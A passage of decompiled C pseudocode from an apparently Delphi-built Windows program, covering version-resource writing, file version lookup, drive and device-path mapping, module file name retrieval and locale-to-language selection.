  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v12 = 0;
  v17 = a2;
  v18 = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_44A95D;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v2 = sub_40867C(*(_DWORD *)(a1 + 8));
  if ( v2 >= 0 )
  {
    v11 = v2 + 1;
    v16 = 0;
    do
    {
      sub_44A350(v17);
      v14 = *(_DWORD *)(v17 + 20);
      sub_44A420(v17, 57005);
      sub_44A420(v17, 0);
      sub_44A420(v17, *(_WORD *)(*(_DWORD *)(v18 + 8) + 12 * v16));
      sub_44A3D0(v17, *(_DWORD *)(*(_DWORD *)(v18 + 8) + 12 * v16 + 4));
      v3 = sub_40867C(*(_DWORD *)(*(_DWORD *)(v18 + 8) + 12 * v16 + 8));
      if ( v3 >= 0 )
      {
        v10 = v3 + 1;
        v15 = 0;
        do
        {
          sub_407030(&v12, *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v18 + 8) + 12 * v16 + 8) + 12 * v15 + 8));
          sub_44A350(v17);
          v13 = *(_DWORD *)(v17 + 20);
          sub_44A420(v17, 57005);
          v4 = System::__linkproc__ LStrLen(v12);
          sub_44A420(v17, v4);
          sub_44A420(v17, *(_WORD *)(*(_DWORD *)(*(_DWORD *)(v18 + 8) + 12 * v16 + 8) + 12 * v15));
          sub_44A3D0(v17, *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v18 + 8) + 12 * v16 + 8) + 12 * v15 + 4));
          sub_44A350(v17);
          if ( System::__linkproc__ LStrLen(v12) > 0 )
          {
            v7 = 2 * System::__linkproc__ LStrLen(v12);
            v5 = (const void *)sub_4071C0(&v12);
            sub_44A260(v17, v5, v7);
          }
          sub_44A320(v17, v13, *(_WORD *)(v17 + 20) - v13);
          ++v15;
          --v10;
        }
        while ( v10 );
      }
      sub_44A320(v17, v14, *(_WORD *)(v17 + 20) - v14);
      ++v16;
      --v11;
    }
    while ( v11 );
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_44A964;
  return sub_406C44(&v12);
}
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);

//----- (0044A970) --------------------------------------------------------
volatile __int32 *__fastcall sub_44A970(int a1, volatile __int32 *a2)
{
  return sub_406FE8(a2, (int)L"VarFileInfo");
}
// 44A99C: using guessed type wchar_t aVarfileinfo[12];

//----- (0044A9C0) --------------------------------------------------------
char __fastcall sub_44A9C0(int a1, int a2, int a3)
{
  int v3; // eax
  _DWORD *v4; // eax
  char v5; // zf
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-38h] BYREF
  int *v12; // [esp-4h] [ebp-30h]
  int v13; // [esp+4h] [ebp-28h] BYREF
  char v14[4]; // [esp+8h] [ebp-24h] BYREF
  int v15; // [esp+Ch] [ebp-20h] BYREF
  int v16; // [esp+10h] [ebp-1Ch]
  char v17[2]; // [esp+14h] [ebp-18h] BYREF
  unsigned __int16 v18; // [esp+16h] [ebp-16h] BYREF
  int v19; // [esp+18h] [ebp-14h] BYREF
  char v20; // [esp+1Fh] [ebp-Dh]
  int v21; // [esp+20h] [ebp-Ch]
  int v22; // [esp+24h] [ebp-8h]
  int v23; // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v19 = 0;
  v21 = a3;
  v22 = a2;
  v23 = a1;
  sub_407D10((int)v14, (int)&byte_449354);
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_44AB97;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v20 = 0;
  while ( sub_44A130(v22) )
  {
    if ( *(_DWORD *)(v22 + 20) >= v21 )
    {
      v20 = 1;
      break;
    }
    sub_408B34(&v15, (int)dword_44931C);
    if ( !sub_44A230(v22, &v18) )
      break;
    v16 = v18 + *(_DWORD *)(v22 + 20) - 2;
    v3 = System::__linkproc__ LStrLen(*(_DWORD *)(v22 + 16));
    if ( v3 < v16 )
      break;
    if ( !sub_44A230(v22, v17) )
      break;
    if ( !sub_44A230(v22, v14) )
      break;
    v4 = sub_406C44(&v19);
    if ( !sub_44A190(v22, v4) )
      break;
    sub_407AA0(v19, (int)L"Translation");
    if ( !v5 || !sub_44A130(v22) )
      break;
    while ( *(_DWORD *)(v22 + 20) < v16 )
    {
      if ( !sub_44A230(v22, &v13) || !sub_44A230(v22, (char *)&v13 + 2) )
        goto LABEL_17;
      v6 = System::__linkproc__ LStrLen(v15);
      System::__linkproc__ DynArraySetLength(v6 + 1);
      v7 = sub_40867C(v15);
      *(_DWORD *)(v15 + 4 * v7) = v13;
    }
    v8 = System::__linkproc__ LStrLen(*(_DWORD *)(v23 + 8));
    System::__linkproc__ DynArraySetLength(v8 + 1);
    v9 = sub_40867C(*(_DWORD *)(v23 + 8));
    sub_407F98(*(_DWORD *)(v23 + 8) + 8 * v9, (int)v14, (int)&byte_449354);
  }
LABEL_17:
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_44AB9E;
  sub_407DEC((int)v14, (int)&byte_449354);
  sub_406C44(&v19);
  return v20;
}
// 44AAA8: variable 'v5' is possibly undefined
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 44931C: using guessed type int dword_44931C[6];
// 449354: using guessed type char byte_449354;
// 44ABB4: using guessed type wchar_t aTranslation[12];
// 44A9C0: using guessed type int var_14;
// 44A9C0: using guessed type char var_24[4];
// 44A9C0: using guessed type char var_18[2];

//----- (0044ABD0) --------------------------------------------------------
int __fastcall sub_44ABD0(int a1, int a2)
{
  int v2; // eax
  __int16 v3; // ax
  int v4; // eax
  unsigned int v6[2]; // [esp-Ch] [ebp-30h] BYREF
  int *v7; // [esp-4h] [ebp-28h]
  int v8; // [esp+0h] [ebp-24h]
  int v9; // [esp+4h] [ebp-20h]
  __int16 v10; // [esp+8h] [ebp-1Ch] BYREF
  int v11; // [esp+Ch] [ebp-18h]
  int v12; // [esp+10h] [ebp-14h]
  int v13; // [esp+14h] [ebp-10h]
  int v14; // [esp+18h] [ebp-Ch]
  int v15; // [esp+1Ch] [ebp-8h]
  int v16; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v15 = a2;
  v16 = a1;
  sub_407D10((int)&v10, (int)&byte_449354);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_44AD05;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v2 = sub_40867C(*(_DWORD *)(v16 + 8));
  if ( v2 >= 0 )
  {
    v9 = v2 + 1;
    v14 = 0;
    do
    {
      sub_407F98((int)&v10, *(_DWORD *)(v16 + 8) + 8 * v14, (int)&byte_449354);
      sub_44A350(v15);
      v12 = *(_DWORD *)(v15 + 20);
      sub_44A420(v15, 57005);
      v3 = System::__linkproc__ LStrLen(v11);
      sub_44A420(v15, 4 * v3);
      sub_44A420(v15, v10);
      sub_44A3D0(v15, (int)L"Translation");
      sub_44A350(v15);
      v4 = sub_40867C(v11);
      if ( v4 >= 0 )
      {
        v8 = v4 + 1;
        v13 = 0;
        do
        {
          sub_44A420(v15, *(_WORD *)(v11 + 4 * v13));
          sub_44A420(v15, *(_WORD *)(v11 + 4 * v13++ + 2));
          --v8;
        }
        while ( v8 );
      }
      sub_44A320(v15, v12, *(_WORD *)(v15 + 20) - v12);
      ++v14;
      --v9;
    }
    while ( v9 );
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_44AD0C;
  return sub_407DEC((int)&v10, (int)&byte_449354);
}
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 449354: using guessed type char byte_449354;
// 44AD1C: using guessed type wchar_t aTranslation_0[12];

//----- (0044AD40) --------------------------------------------------------
int sub_44AD40()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_44AD77;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_46EE98 )
    sub_408B34(&dword_46EE9C, (int)&byte_4495EC);
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 4495EC: using guessed type char byte_4495EC;
// 46EE98: using guessed type int dword_46EE98;
// 46EE9C: using guessed type int dword_46EE9C;

//----- (0044AE00) --------------------------------------------------------
char __fastcall sub_44AE00(int a1, _WORD *a2, _WORD *a3, _WORD *a4, _WORD *a5)
{
  int v5; // eax
  int v6; // eax
  int v8; // [esp-24h] [ebp-50h]
  int v9; // [esp-20h] [ebp-4Ch]
  int v10; // [esp-1Ch] [ebp-48h]
  struct _EXCEPTION_REGISTRATION_RECORD *v11; // [esp-18h] [ebp-44h] BYREF
  void *v12; // [esp-14h] [ebp-40h]
  int *v13; // [esp-10h] [ebp-3Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-38h] BYREF
  void *v15; // [esp-8h] [ebp-34h]
  int *v16; // [esp-4h] [ebp-30h]
  void *v17; // [esp+0h] [ebp-2Ch]
  int v18; // [esp+4h] [ebp-28h] BYREF
  int v19; // [esp+8h] [ebp-24h] BYREF
  int v20; // [esp+Ch] [ebp-20h] BYREF
  int Mem; // [esp+10h] [ebp-1Ch]
  int v22; // [esp+14h] [ebp-18h] BYREF
  int v23; // [esp+18h] [ebp-14h]
  char v24; // [esp+1Fh] [ebp-Dh]
  _WORD *v25; // [esp+20h] [ebp-Ch]
  _WORD *v26; // [esp+24h] [ebp-8h]
  int v27; // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v18 = 0;
  v25 = a3;
  v26 = a2;
  v27 = a1;
  v16 = &savedregs;
  v15 = &loc_44AF86;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v24 = 0;
  *a2 = 0;
  *v25 = 0;
  *a4 = 0;
  *a5 = 0;
  if ( *off_467EA8 )
  {
    if ( *off_467F20 )
    {
      if ( *off_468120[0] )
      {
        sub_426830(v27, &v18);
        v22 = 0;
        v19 = 0;
        v20 = 0;
        v5 = sub_407790(v18);
        v23 = ((int (__stdcall *)(int, int *))*off_467EA8)(v5, &v22);
        if ( v23 )
        {
          Mem = System::__linkproc__ GetMem(v23);
          v13 = &savedregs;
          v12 = &loc_44AF69;
          v11 = NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)&v11);
          v10 = Mem;
          v9 = v23;
          v8 = v22;
          v6 = sub_407790(v18);
          if ( ((int (__stdcall *)(int, int, int, int, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))*off_467F20)(
                 v6,
                 v8,
                 v9,
                 v10,
                 v11,
                 v12,
                 v13,
                 ExceptionList)
            && (*(int (__stdcall **)(int, int *, int *, int *))off_468120[0])(Mem, dword_44AF98, &v20, &v19) )
          {
            *v26 = HIWORD(*(_DWORD *)(v20 + 8));
            *v25 = *(_WORD *)(v20 + 8);
            *a4 = HIWORD(*(_DWORD *)(v20 + 12));
            *a5 = *(_WORD *)(v20 + 12);
            v24 = 1;
          }
          __writefsdword(0, (unsigned int)v15);
          v17 = &loc_44AF70;
          System::__linkproc__ FreeMem(Mem);
        }
      }
    }
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v16 = (int *)&loc_44AF8D;
  sub_406C44(&v18);
  return v24;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 44AF98: using guessed type int dword_44AF98[2];
// 467EA8: using guessed type int *off_467EA8;
// 467F20: using guessed type int *off_467F20;
// 468120: using guessed type int *off_468120[2];

//----- (0044AFA0) --------------------------------------------------------
int __fastcall sub_44AFA0(int a1, int a2, int *a3)
{
  unsigned int v4; // [esp-28h] [ebp-50h]
  _DWORD v5[4]; // [esp-Ch] [ebp-34h] BYREF
  unsigned int v6; // [esp+4h] [ebp-24h] BYREF
  int v7; // [esp+8h] [ebp-20h] BYREF
  int v8; // [esp+Ch] [ebp-1Ch] BYREF
  int v9; // [esp+10h] [ebp-18h] BYREF
  unsigned __int16 v10; // [esp+14h] [ebp-14h] BYREF
  unsigned __int16 v11; // [esp+16h] [ebp-12h] BYREF
  unsigned __int16 v12; // [esp+18h] [ebp-10h] BYREF
  unsigned __int16 v13; // [esp+1Ah] [ebp-Eh] BYREF
  int *v14; // [esp+1Ch] [ebp-Ch]
  int v15; // [esp+20h] [ebp-8h]
  int v16; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v9 = 0;
  v8 = 0;
  v7 = 0;
  v6 = 0;
  v14 = a3;
  v15 = a2;
  v16 = a1;
  v5[2] = &savedregs;
  v5[1] = &loc_44B066;
  v5[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  if ( sub_44AE00(a1, &v13, &v12, &v11, &v10) )
  {
    sub_415150(v13, &v9);
    sub_415150(v12, &v8);
    sub_415150(v11, &v7);
    sub_415150(v10, (int *)&v6);
    v4 = v6;
    sub_4079F0(v14, 7);
  }
  else
  {
    sub_406FE8(v14, v15);
  }
  __writefsdword(0, v4);
  return sub_406CA4((int)&v6, 4);
}
// 44B050: variable 'v4' is possibly undefined
// 44B078: using guessed type _strings str___2[1];

//----- (0044B090) --------------------------------------------------------
_DWORD *__fastcall sub_44B090(_DWORD *a1)
{
  int v1; // ecx
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // eax
  int v5; // eax
  unsigned int v7[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v8; // [esp-4h] [ebp-20h]
  int v9; // [esp+0h] [ebp-1Ch]
  int v10; // [esp+4h] [ebp-18h] BYREF
  int v11; // [esp+8h] [ebp-14h]
  int v12; // [esp+Ch] [ebp-10h]
  int v13; // [esp+10h] [ebp-Ch]
  int v14; // [esp+14h] [ebp-8h] BYREF
  _DWORD *v15; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v14 = 0;
  v10 = 0;
  v15 = a1;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_44B1EB;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_408B34(a1, (int)&byte_4224D0);
  sub_406C44(&v14);
  if ( *off_467E90 )
  {
    v11 = ((int (__stdcall *)(_DWORD, _DWORD))*off_467E90)(0, 0);
    sub_407890(&v14, v11, v1);
    v2 = sub_407790(v14);
    v11 = ((int (__stdcall *)(int, int))*off_467E90)(v11, v2);
    if ( v11 )
    {
      v3 = sub_408B34(&v10, (int)&byte_4224D0);
      sub_424750(v14, (int)&dword_44B254, v3);
      v4 = System::__linkproc__ LStrLen(v10);
      System::__linkproc__ DynArraySetLength(v4);
      v12 = 0;
      v5 = sub_40867C(v10);
      if ( v5 >= 0 )
      {
        v9 = v5 + 1;
        v13 = 0;
        do
        {
          if ( *(_DWORD *)(v10 + 4 * v13) )
            sub_406FE8((volatile __int32 *)(*v15 + 4 * v12++), *(_DWORD *)(v10 + 4 * v13));
          ++v13;
          --v9;
        }
        while ( v9 );
      }
      System::__linkproc__ DynArraySetLength(v12);
    }
  }
  else
  {
    sub_433460(*off_467F18, (int)L"GetLogicalDriveStringsW not found", 0);
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_44B1F2;
  sub_408B34(&v10, (int)&byte_4224D0);
  return sub_406C44(&v14);
}
// 44B0FD: variable 'v1' is possibly undefined
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 4224D0: using guessed type char byte_4224D0;
// 44B204: using guessed type wchar_t aGetlogicaldriv_0[34];
// 44B254: using guessed type int dword_44B254;
// 467E90: using guessed type int *off_467E90;
// 467F18: using guessed type int *off_467F18;

//----- (0044B260) --------------------------------------------------------
int *__fastcall sub_44B260(int a1, int *a2, int a3)
{
  int v4; // eax
  int v5; // ecx
  int v6; // [esp-8h] [ebp-14h]
  int v7; // [esp-4h] [ebp-10h]
  int v8; // [esp+0h] [ebp-Ch]

  if ( *off_467FE8 )
  {
    sub_407890(a2, 1024, a3);
    v7 = System::__linkproc__ LStrLen(*a2);
    v6 = sub_407790(*a2);
    v4 = sub_407790(a1);
    v8 = ((int (__stdcall *)(int, int, int))*off_467FE8)(v4, v6, v7);
    sub_407890(a2, v8, v5);
    return sub_424610(a2);
  }
  else
  {
    sub_406C44(a2);
    return sub_433460(*off_467F18, (int)L"QueryDosDeviceW not found", 0);
  }
}
// 44B2D1: variable 'v5' is possibly undefined
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 44B2F0: using guessed type wchar_t aQuerydosdevice_0[26];
// 467F18: using guessed type int *off_467F18;
// 467FE8: using guessed type int *off_467FE8;

//----- (0044B330) --------------------------------------------------------
_DWORD *__fastcall sub_44B330(int a1, int a2)
{
  int v2; // eax
  int v3; // ecx
  int v4; // eax
  char v5; // zf
  int v6; // eax
  unsigned int v8[2]; // [esp-Ch] [ebp-30h] BYREF
  int *v9; // [esp-4h] [ebp-28h]
  void *v10; // [esp+0h] [ebp-24h] BYREF
  int v11; // [esp+4h] [ebp-20h] BYREF
  int v12; // [esp+8h] [ebp-1Ch]
  void *v13; // [esp+Ch] [ebp-18h] BYREF
  int v14; // [esp+10h] [ebp-14h] BYREF
  int v15; // [esp+14h] [ebp-10h]
  int v16; // [esp+18h] [ebp-Ch] BYREF
  int v17; // [esp+1Ch] [ebp-8h]
  int v18; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v17 = a2;
  v18 = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_44B451;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_44B090(&v16);
  sub_406C44((_DWORD *)v17);
  v2 = sub_40867C(v16);
  if ( v2 >= 0 )
  {
    v12 = v2 + 1;
    v15 = 0;
    while ( 1 )
    {
      sub_407030((volatile __int32 *)&v13, *(_DWORD *)(v16 + 4 * v15));
      if ( System::__linkproc__ LStrLen(v13) > 2 )
        sub_407890(&v13, 2, v3);
      sub_44B260((int)v13, &v14, v3);
      if ( v14 )
      {
        v4 = System::__linkproc__ LStrLen(v14);
        sub_407AD8(v18, 1, v4, &v11);
        sub_407AA0(v11, v14);
        if ( v5 )
          break;
      }
      ++v15;
      if ( !--v12 )
        goto LABEL_9;
    }
    v6 = System::__linkproc__ LStrLen(v14);
    sub_407AD8(v18, v6 + 1, 0x7FFFFFFF, &v10);
    sub_407968((volatile __int32 *)v17, v13, v10);
  }
LABEL_9:
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_44B458;
  sub_406CA4((int)&v10, 2);
  sub_406CA4((int)&v13, 2);
  return sub_408B34(&v16, (int)&byte_4224D0);
}
// 44B3A5: variable 'v3' is possibly undefined
// 44B3E1: variable 'v5' is possibly undefined
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4224D0: using guessed type char byte_4224D0;

//----- (0044B460) --------------------------------------------------------
_DWORD *__fastcall sub_44B460(LCID a1, int a2)
{
  WCHAR LCData[86]; // [esp+0h] [ebp-B8h] BYREF
  int LocaleInfoW_1; // [esp+ACh] [ebp-Ch]
  int v5; // [esp+B0h] [ebp-8h]
  LCID Locale; // [esp+B4h] [ebp-4h]

  v5 = a2;
  Locale = a1;
  LocaleInfoW_1 = GetLocaleInfoW_1(a1, 0x59u, LCData, 86);
  if ( LocaleInfoW_1 <= 0 )
    return sub_406C44((_DWORD *)v5);
  else
    return sub_406D90((_DWORD *)v5, LCData, LocaleInfoW_1 - 1);
}

//----- (0044B4B0) --------------------------------------------------------
char __fastcall sub_44B4B0(char a1, char a2)
{
  _DWORD *v2; // eax
  char v3; // zf
  int v5; // [esp-10h] [ebp-2Ch]
  unsigned int v6[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v7; // [esp-4h] [ebp-20h]
  int v8; // [esp+0h] [ebp-1Ch] BYREF
  int v9; // [esp+4h] [ebp-18h]
  int UserDefaultLCID; // [esp+8h] [ebp-14h]
  int *v11; // [esp+Ch] [ebp-10h] BYREF
  __int32 v12; // [esp+10h] [ebp-Ch] BYREF
  DWORD cchLength; // [esp+14h] [ebp-8h] BYREF
  char v14; // [esp+19h] [ebp-3h]
  char v15; // [esp+1Ah] [ebp-2h]
  char v16; // [esp+1Bh] [ebp-1h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v9 = 0;
  v8 = 0;
  v15 = a2;
  v16 = a1;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_44B86B;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v14 = a1;
  UserDefaultLCID = 0;
  if ( a2 )
  {
    if ( a2 == 1 )
    {
      HIWORD(v9) = GetUserDefaultUILanguage_0();
      if ( HIWORD(v9) == 5120 )
        goto LABEL_101;
      UserDefaultLCID = sub_40C8DC(HIWORD(v9), 0);
    }
  }
  else
  {
    UserDefaultLCID = GetUserDefaultLCID();
  }
  sub_44B460(UserDefaultLCID, (int)&cchLength);
  sub_426A60(cchLength, &v8);
  v5 = v8;
  v2 = sub_408B34(&v11, (int)&byte_4224D0);
  sub_424750(v5, (int)&str___15[1], v2);
  if ( System::__linkproc__ LStrLen(v11) <= 0 )
  {
LABEL_12:
    if ( UserDefaultLCID > 4108 )
    {
      if ( UserDefaultLCID > 10249 )
      {
        if ( UserDefaultLCID > 15370 )
        {
          if ( UserDefaultLCID > 18442 )
          {
            if ( UserDefaultLCID != 19466 && UserDefaultLCID != 20490 )
              goto LABEL_101;
          }
          else if ( UserDefaultLCID != 18442 && UserDefaultLCID != 16394 && UserDefaultLCID != 17418 )
          {
            goto LABEL_101;
          }
          goto LABEL_93;
        }
        if ( UserDefaultLCID == 15370 )
          goto LABEL_93;
        if ( UserDefaultLCID > 12298 )
        {
          if ( UserDefaultLCID != 13322 && UserDefaultLCID != 14346 )
            goto LABEL_101;
          goto LABEL_93;
        }
        if ( UserDefaultLCID == 12298 || UserDefaultLCID == 10250 )
          goto LABEL_93;
        if ( UserDefaultLCID != 11273 )
        {
          if ( UserDefaultLCID != 11274 )
            goto LABEL_101;
          goto LABEL_93;
        }
        goto LABEL_91;
      }
      if ( UserDefaultLCID == 10249 )
        goto LABEL_91;
      if ( UserDefaultLCID > 6154 )
      {
        if ( UserDefaultLCID > 8202 )
        {
          if ( UserDefaultLCID != 9225 )
          {
            if ( UserDefaultLCID != 9226 )
              goto LABEL_101;
            goto LABEL_93;
          }
        }
        else
        {
          if ( UserDefaultLCID == 8202 )
            goto LABEL_93;
          if ( UserDefaultLCID != 7177 )
          {
            if ( UserDefaultLCID == 7178 )
              goto LABEL_93;
            if ( UserDefaultLCID != 8201 )
              goto LABEL_101;
          }
        }
        goto LABEL_91;
      }
      if ( UserDefaultLCID == 6154 )
        goto LABEL_93;
      if ( UserDefaultLCID <= 5130 )
      {
        switch ( UserDefaultLCID )
        {
          case 5130:
            goto LABEL_93;
          case 5124:
            goto LABEL_100;
          case 5127:
            goto LABEL_92;
        }
        if ( UserDefaultLCID != 5129 )
          goto LABEL_101;
        goto LABEL_91;
      }
      if ( UserDefaultLCID != 5132 )
      {
        if ( UserDefaultLCID != 6153 )
          goto LABEL_101;
        goto LABEL_91;
      }
    }
    else if ( UserDefaultLCID != 4108 )
    {
      if ( UserDefaultLCID <= 2055 )
      {
        if ( UserDefaultLCID != 2055 )
        {
          if ( UserDefaultLCID <= 1041 )
          {
            if ( UserDefaultLCID == 1041 )
            {
              v14 = 10;
            }
            else
            {
              switch ( UserDefaultLCID )
              {
                case 1028:
                  goto LABEL_100;
                case 1031:
                  goto LABEL_92;
                case 1033:
                  v14 = 1;
                  break;
                case 1034:
                  goto LABEL_93;
                case 1036:
                  goto LABEL_94;
                case 1040:
                  goto LABEL_95;
                default:
                  goto LABEL_101;
              }
            }
            goto LABEL_101;
          }
          if ( UserDefaultLCID <= 1055 )
          {
            switch ( UserDefaultLCID )
            {
              case 1055:
                v14 = 7;
                goto LABEL_101;
              case 1042:
                v14 = 9;
                goto LABEL_101;
              case 1045:
                v14 = 6;
                goto LABEL_101;
            }
            if ( UserDefaultLCID != 1049 )
              goto LABEL_101;
            goto LABEL_89;
          }
          if ( (unsigned int)(UserDefaultLCID - 1058) < 2 )
          {
LABEL_89:
            v14 = 0;
            goto LABEL_101;
          }
          if ( UserDefaultLCID != 2052 )
            goto LABEL_101;
LABEL_100:
          v14 = 8;
          goto LABEL_101;
        }
LABEL_92:
        v14 = 2;
        goto LABEL_101;
      }
      if ( UserDefaultLCID <= 3081 )
      {
        if ( UserDefaultLCID != 3081 )
        {
          if ( UserDefaultLCID > 2064 )
          {
            if ( UserDefaultLCID == 3076 )
              goto LABEL_100;
            if ( UserDefaultLCID != 3079 )
              goto LABEL_101;
            goto LABEL_92;
          }
          if ( UserDefaultLCID == 2064 )
          {
LABEL_95:
            v14 = 5;
            goto LABEL_101;
          }
          if ( UserDefaultLCID != 2057 )
          {
            if ( UserDefaultLCID != 2058 )
            {
              if ( UserDefaultLCID != 2060 )
                goto LABEL_101;
              goto LABEL_94;
            }
LABEL_93:
            v14 = 3;
            goto LABEL_101;
          }
        }
LABEL_91:
        v14 = 1;
        goto LABEL_101;
      }
      if ( UserDefaultLCID > 4103 )
      {
        if ( UserDefaultLCID != 4105 )
        {
          if ( UserDefaultLCID != 4106 )
            goto LABEL_101;
          goto LABEL_93;
        }
        goto LABEL_91;
      }
      if ( UserDefaultLCID == 4103 )
        goto LABEL_92;
      if ( UserDefaultLCID == 3082 )
        goto LABEL_93;
      if ( UserDefaultLCID != 3084 )
      {
        if ( UserDefaultLCID != 4100 )
          goto LABEL_101;
        goto LABEL_100;
      }
    }
LABEL_94:
    v14 = 4;
    goto LABEL_101;
  }
  sub_414CB4(*v11, &v12);
  BYTE1(v9) = 0;
  while ( 1 )
  {
    sub_407AA0((int)off_467F84[BYTE1(v9)], v12);
    if ( v3 )
      break;
    if ( ++BYTE1(v9) == 11 )
      goto LABEL_12;
  }
  v14 = BYTE1(v9);
LABEL_101:
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_44B872;
  sub_406C44(&v8);
  sub_408B34(&v11, (int)&byte_4224D0);
  sub_406CA4((int)&v12, 2);
  return v14;
}
// 44B57B: variable 'v3' is possibly undefined
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4224D0: using guessed type char byte_4224D0;
// 44B880: using guessed type _strings str___15[1];
// 467F84: using guessed type wchar_t **off_467F84;

//----- (0044B890) --------------------------------------------------------
int __fastcall sub_44B890(int a1, int a2, int *a3)
{
  int v3; // ecx
  int v4; // ecx
  int v5; // eax
  int v6; // eax
  unsigned int v8[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v9; // [esp-4h] [ebp-24h]
  int v10; // [esp+4h] [ebp-1Ch] BYREF
  int v11; // [esp+8h] [ebp-18h] BYREF
  char v12; // [esp+Fh] [ebp-11h]
  int v13; // [esp+10h] [ebp-10h]
  int *v14; // [esp+14h] [ebp-Ch]
  int v15; // [esp+18h] [ebp-8h]
  int v16; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v10 = 0;
  v11 = 0;
  v14 = a3;
  v15 = a2;
  v16 = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_44B99E;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v12 = 0;
  sub_406C44(a3);
  sub_407890(v14, 0x8000, v3);
  v13 = 0;
  if ( *off_467FD8 )
  {
    v5 = sub_407790(*v14);
    v13 = ((int (__stdcall *)(int, int, int, int))*off_467FD8)(v16, v15, v5, 0x8000);
  }
  if ( *off_46803C && !v15 && !v13 )
  {
    v6 = sub_407790(*v14);
    v13 = ((int (__stdcall *)(int, int, int))*off_46803C)(v16, v6, 0x8000);
    v12 = 1;
  }
  sub_407890(v14, v13, v4);
  if ( v12 )
  {
    sub_44B330(*v14, (int)&v10);
    sub_406FE8(v14, v10);
  }
  sub_427370(*v14, &v11);
  if ( v11 )
    sub_406FE8(v14, v11);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_44B9A5;
  return sub_406CA4((int)&v10, 2);
}
// 44B8CA: variable 'v3' is possibly undefined
// 44B942: variable 'v4' is possibly undefined
// 467FD8: using guessed type int *off_467FD8;
// 46803C: using guessed type int *off_46803C;
// 44B890: using guessed type int var_18;

//----- (0044B9B0) --------------------------------------------------------
int *__fastcall sub_44B9B0(void *a1, int *a2)
{
  int *result; // eax
  int v3; // ecx
  void *v4; // eax
  DWORD v5; // [esp-8h] [ebp-40h]
  char v6[4]; // [esp+0h] [ebp-38h] BYREF
  int v7; // [esp+4h] [ebp-34h]
